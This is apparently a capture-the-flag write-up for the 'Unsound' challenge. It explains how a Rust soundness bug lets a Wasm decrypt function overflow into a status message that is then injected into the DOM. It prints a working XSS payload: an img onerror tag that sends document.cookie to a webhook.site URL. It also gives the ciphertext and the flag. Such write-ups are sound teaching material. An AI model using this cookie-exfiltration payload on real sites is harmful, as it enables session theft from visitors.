# Unsound

### Credit

A special thanks to [cve-rs](https://github.com/Speykious/cve-rs) for making this problem possible. There is an soundness bug in Rust that allowed us to introduce a buffer overflow in completely safe Rust. A great video explaining this bug is linked [here](https://www.youtube.com/watch?v=vfMpIsJwpjU).

### Function

Studying the JavaScript code should offer some insight into what the program is doing. It is taking a string as input and calling a Wasm `encrypt` function on it or taking a base64 encoded ciphertext and calling `decrypt` on it. Although the program displays the encrypted ciphertext, it does not display the decrypted plaintext. Instead, it displays a status message that notifies the attacker of whether or not the message was properly decrypted. This status message is embedded into a `div` on the page.

### Exploit

`encrypt` and `decrypt` are binded Wasm functions that were originally written in Rust. In the decrypt function (line 106), we see that although the `last_decryption` variable has a size of 300 bytes, we can write up to 600 bytes to it. This means that passing a ciphertext larger than 300 bytes will begin to overflow into `success_msg`. As a result, we padded the plaintext with 300 A's. Any text after the 300 A's will become the status message on a successful decrypt. Since the status message is injected directly into the DOM, there is a potential for XSS. We prove XSS capability by sending the browser's cookies to a remote server. Any public site would work, but an easy one is [https://webhook.site/](https://webhook.site/). This site generates a unique URL and displays request data for any requests to that URL. We craft an XSS exploit to traffic the browser's cookies to Webhook as shown below.
https://webhook.site/#!/view/d022772f-1d20-445e-a648-378a4824f338

`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<img src="" onerror="fetch('https://webhook.site/d022772f-1d20-445e-a648-378a4824f338/&cookies=' + document.cookie)" />`

We then use the website to encrypt this payload. 

WDTChsOzw650w48twrlzW8KZAXLCi8O6UxVIEBHCicORwoUgUcK9H2PCryfCmxDCqMOgwpo0w6AMw6LDrVFvwpvCr0ZEScKew6TCn3LCuMO6wqd6w7PCpgzDl3vDu1vCicKXw4tIwq7Dq1zDrsKzwppYUcKEEhp4G0Fgwr3Du1IJw7HCnHXCocKJw6XCvlbDj8Ovwo7Dh0h8QsO3wqIcQVjClBzCvQHCmElYHcKdw5NGfsOEeT92Sldrw7/Cr8Kiw7rDjcOEw7VYw5saw4JOw4DDvsKOw4nDqiAdQsOQKVpSw4zDsn7CqcOpw6jDksKHwpDCtsKaw53CmsOtVsKBOzbDjBjCigbDmcOhw5dCSGrDi8Kvw5DCqMOvFC/CsgzCjMOAXGbCrhTDtcK6wrrCrjV2fCnDiyfDg8OQw6nCs8KAw4nDh13DjSB/wr4pJ8OQDMK/b8Kiw75kKnvCkHPCrMObwqTDk8Kyw77DqMKueAtCw40RCMOOScOMMCzDg8K6cmtCw6kQDMOqe3/Dq8KrOsOxw6nChGMQw5klwo3ClSsAw7XCjD3Cn8OfMw0BS8OdeG7Cu8OrOcOkw5TDuQYqw68ZEGrCjcKww7DCuDfCgsKWw6kpEjFfcMO0ZsOSwp8Uw6lRwonChzLDi1IvwqIvDHPDhsKuTsOsw7jCvTbDtsOvegLDjCDDpsKewpILw6nDoMOcC8Oww44kw5MRFMOxAi3CvALCucOdwq8uw7vDoVlHNsKvw6gJw4PCksOQwovDscOqUsOXw7jCpcKuw7PDj8KEO8OAHcKUw7F7I8KzKsOrwqnDpMOeEmPDlcOLS8K4YcOow6ADwoA+d8OUDynCrRJNGjJKwoNX

We then decrypt this payload. The overflow should set the status message to be `<img src="" onerror="fetch('https://webhook.site/d022772f-1d20-445e-a648-378a4824f338/&cookies=' + document.cookie)" />`. When this status message is appended to the DOM, our JavaScript code will render and the browser's cookies will be sent to our unique webhook URL. One of these cookies contains the flag.

`utflag{4ma11y_v3rif!ed_t0_b3_m3m0rY_s4fe_L0l}`
